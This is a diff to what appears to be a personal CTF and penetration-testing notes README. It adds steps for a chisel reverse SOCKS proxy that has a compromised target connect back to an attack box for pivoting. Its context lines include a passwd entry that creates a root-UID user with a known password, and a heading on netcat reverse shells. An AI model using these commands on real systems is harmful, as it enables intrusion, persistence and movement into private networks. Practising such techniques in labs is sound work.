@@ -11,6 +11,17 @@ Just various bits of script and techniques I've found useful.
 - Static binaries: https://github.com/andrew-d/static-binaries/tree/master/binaries/linux/x86_64
 - passwd user to add (pass123): `user3:$1$user3$rAGRVf5p2jYTqtqOW5cPu/:0:0:/root:/bin/bash`
 
+## Chisel reverse socks proxy
+
+Useful for pivoting, opens a socks proxy from the target to your attack box, basically so the attack box has a proxy to the target's network.
+
+1. Get chisel, via its release page: https://github.com/jpillora/chisel/releases/tag/v1.7.6
+2. Get a copy on the target and the attack box. 
+3. Create a server on the attack box: `./chisel server -p 1337 --reverse &`
+4. From the target, connect to the attack box via `./chisel client ATTACK-BOX-IP:1337 R:socks &`
+
+This will open a proxy on 1080, which you can then setup via proxychains etc.
+
 ## Reverse shells
 
 If netcat with -e exists (very rare in CTFs, in my experience):
